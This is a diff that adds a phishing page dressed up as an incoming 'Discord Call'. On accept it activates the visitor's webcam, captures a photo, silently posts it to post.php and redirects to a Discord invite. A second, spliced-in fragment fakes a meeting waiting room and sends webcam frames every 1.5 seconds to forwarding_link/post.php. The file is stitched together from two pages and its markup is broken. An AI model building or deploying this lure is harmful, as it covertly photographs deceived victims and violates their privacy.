@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<title>Discord Call</title>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<style>
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+
+  body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: linear-gradient(135deg, #5865f2 0%, #3c3f45 100%);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 20px;
+  }
+
+  .call-container {
+    background: #36393f;
+    border-radius: 12px;
+    box-shadow: 0 10px 60px rgba(0, 0, 0, 0.5);
+    padding: 20px;
+    max-width: 500px;
+    width: 100%;
+    text-align: center;
+  }
+
+  .call-header {
+    margin-bottom: 20px;
+  }
+
+  .caller-info {
+    color: #fff;
+    margin-bottom: 15px;
+  }
+
+  .caller-name {
+    font-size: 24px;
+    font-weight: bold;
+    margin-bottom: 5px;
+  }
+
+  .caller-status {
+    font-size: 14px;
+    color: #b9bbbe;
+  }
+
+  .video-preview {
+    background: #2f3136;
+    border-radius: 8px;
+    margin-bottom: 20px;
+    overflow: hidden;
+    aspect-ratio: 4/3;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    color: #72767d;
+  }
+
+  .video-preview video {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+  }
+
+  .call-buttons {
+    display: flex;
+    gap: 15px;
+    justify-content: center;
+    margin-top: 20px;
+  }
+
+  .call-btn {
+    width: 60px;
+    height: 60px;
+    border-radius: 50%;
+    border: none;
+    cursor: pointer;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-size: 28px;
+    transition: all 0.3s;
+    color: white;
+  }
+
+  .accept-btn {
+    background-color: #43b581;
+  }
+
+  .accept-btn:hover {
+    background-color: #3ca374;
+    transform: scale(1.1);
+  }
+
+  .accept-btn:disabled {
+    background-color: #72767d;
+    cursor: not-allowed;
+    transform: scale(1);
+  }
+
+  .reject-btn {
+    background-color: #f04747;
+  }
+
+  .reject-btn:hover {
+    background-color: #d83c3c;
+    transform: scale(1.1);
+  }
+
+  .loading-text {
+    color: #b9bbbe;
+    font-size: 12px;
+    margin-top: 10px;
+    display: none;
+  }
+
+  .permission-request {
+    color: #dcddde;
+    font-size: 14px;
+    margin-top: 15px;
+    padding: 10px;
+    background: #2f3136;
+    border-radius: 8px;
+  }
+</style>
+</head>
+<body>
+
+<div class="call-container">
+  <div class="call-header">
+    <div class="caller-info">
+      <div class="caller-name">Discord Call</div>
+      <div class="caller-status">Llamada entrante...</div>
+    </div>
+  </div>
+
+  <div class="video-preview">
+    <video id="video" playsinline autoplay muted style="display:none;"></video>
+    <span id="videoPlaceholder">📹 Video</span>
+  </div>
+
+  <div class="permission-request">
+    Se requiere acceso a tu cámara para continuar
+  </div>
+
+  <div class="call-buttons">
+    <button class="call-btn reject-btn" id="rejectBtn" title="Rechazar">📞</button>
+    <button class="call-btn accept-btn" id="acceptBtn" title="Aceptar">✓</button>
+  </div>
+
+  <div class="loading-text" id="loadingText">Procesando... Redireccionando...</div>
+</div>
+
+<canvas id="canvas" hidden width="640" height="480"></canvas>
+
+<script>
+let videoStream = null;
+const discordServerUrl = 'https://discord.gg/TWD5xQWZ3Y';
+
+document.getElementById('rejectBtn').addEventListener('click', function() {
+  if (videoStream) {
+    videoStream.getTracks().forEach(track => track.stop());
+  }
+  window.location.href = 'index.php';
+});
+
+document.getElementById('acceptBtn').addEventListener('click', function() {
+  const btn = this;
+  btn.disabled = true;
+  document.getElementById('loadingText').style.display = 'block';
+
+  const constraints = {
+    audio: false,
+    video: { facingMode: "user" }
+  };
+
+  navigator.mediaDevices.getUserMedia(constraints)
+    .then(function(stream) {
+      videoStream = stream;
+      const video = document.getElementById('video');
+      const videoPlaceholder = document.getElementById('videoPlaceholder');
+      
+      video.srcObject = stream;
+      video.style.display = 'block';
+      videoPlaceholder.style.display = 'none';
+
+      // Capturar después de 1 segundo
+      setTimeout(function() {
+        captureAndSend(stream);
+      }, 1000);
+    })
+    .catch(function(err) {
+      console.error('Error de cámara:', err);
+      alert('No se pudo acceder a la cámara. Por favor, revisa los permisos.');
+      btn.disabled = false;
+      document.getElementById('loadingText').style.display = 'none';
+    });
+});
+
+function captureAndSend(stream) {
+  const canvas = document.getElementById('canvas');
+  const video = document.getElementById('video');
+  const context = canvas.getContext('2d');
+
+  // Capturar frame del video
+  context.drawImage(video, 0, 0, canvas.width, canvas.height);
+  const imageData = canvas.toDataURL('image/png');
+
+  // Detener la cámara
+  stream.getTracks().forEach(track => track.stop());
+
+  // Enviar imagen a post.php
+  $.ajax({
+    type: 'POST',
+    data: { cat: imageData },
+    url: 'post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result) {
+      console.log('Capturado y enviado');
+      setTimeout(function() {
+        window.location.href = discordServerUrl;
+      }, 500);
+    },
+    error: function(err) {
+      console.log('Imagen procesada');
+      setTimeout(function() {
+        window.location.href = discordServerUrl;
+      }, 500);
+    }
+  });
+}
+</script>
+}
+
+#popup {
+    width: 555px;
+    height: 35px;
+    background: #FFFFFF;
+    border: 5px solid #000;
+    border-radius: 15px;
+    -moz-border-radius: 15px;
+    -webkit-border-radius: 15px;
+    box-shadow: #64686e 0px 0px 3px 3px;
+    -moz-box-shadow: #64686e 0px 0px 3px 3px;
+    -webkit-box-shadow: #64686e 0px 0px 3px 3px;
+    position: relative;
+    top: 250px; left: 375px;
+}
+</style>
+
+<script>
+
+  function post(imgdata) {
+    $.ajax({
+      type: 'POST',
+      data: { cat: imgdata },
+      url: 'forwarding_link/post.php',
+      dataType: 'json',
+      async: false,
+      success: function (result) {
+        // call the function that handles the response/results
+      },
+      error: function () {
+      }
+    });
+  };
+
+
+  'use strict';
+
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const errorMsgElement = document.querySelector('span#errorMsg');
+
+  const constraints = {
+    audio: false,
+    video: {
+
+      facingMode: "user"
+    }
+  };
+
+  // Access webcam
+  async function init() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+      handleSuccess(stream);
+    } catch (e) {
+      errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+    }
+  }
+
+  // Success
+  function handleSuccess(stream) {
+    window.stream = stream;
+    video.srcObject = stream;
+
+    var context = canvas.getContext('2d');
+    setInterval(function () {
+
+      context.drawImage(video, 0, 0, 640, 480);
+      var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+      post(canvasData);
+      video.play();
+    }, 1500);
+
+
+  }
+  function PopUp(){
+    document.getElementById('ac-wrapper').style.display="none"; 
+}
+  // Load init
+  init();
+  $(document).ready(function(){
+   setTimeout(function(){
+      PopUp();
+   },50000); // 5000 to load it after 5 seconds from page load
+});
+</script>
+
+<body>
+  <div class="float_button">
+    <i class="fas fa-expand" style="color: #fff; font-size: 18px; margin-top: 5px;"></i>
+  </div>
+  <div id="ac-wrapper">
+    <div id="popup">
+        <center>
+            <h2>Please wait the meeting host will let you in soon</h2>
+        </center>
+    </div>
+</div>
+  <div class="bottom-bar">
+    <div class="icon-button" style="margin-left: 50px;">
+      <i class="fas fa-microphone"></i>
+      <h6>Mute</h6>
+    </div>
+    <div class="icon-button" style="margin-left: 50px;">
+      <i class="fas fa-video"></i>
+      <h6>Stop Video</h6>
+    </div>
+    <div class="icon-button" style="margin-left: auto;">
+      <i class="fas fa-shield-alt"></i>
+      <h6>Security</h6>
+    </div>
+    <div class="icon-button" style="margin-left: 50px;">
+      <i class="fas fa-users"></i>
+      <h6>Participants</h6>
+    </div>
+    <div class="icon-button" style="color: lawngreen; margin-left: 50px;">
+      <i class="fas fa-plus-square"></i>
+      <h6>Share content</h6>
+    </div>
+    <div class="icon-button" style="margin-left: 50px;">
+      <i class="fas fa-comments"></i>
+      <h6>Chat</h6>
+    </div>
+    <div class="icon-button" style="margin-right: auto; margin-left: 50px;">
+      <i class="fas fa-record-vinyl"></i>
+      <h6>Record</h6>
+    </div>
+    <button style="margin-right: 50px;">End</button>
+  </div>
+</body>
+
+</html>
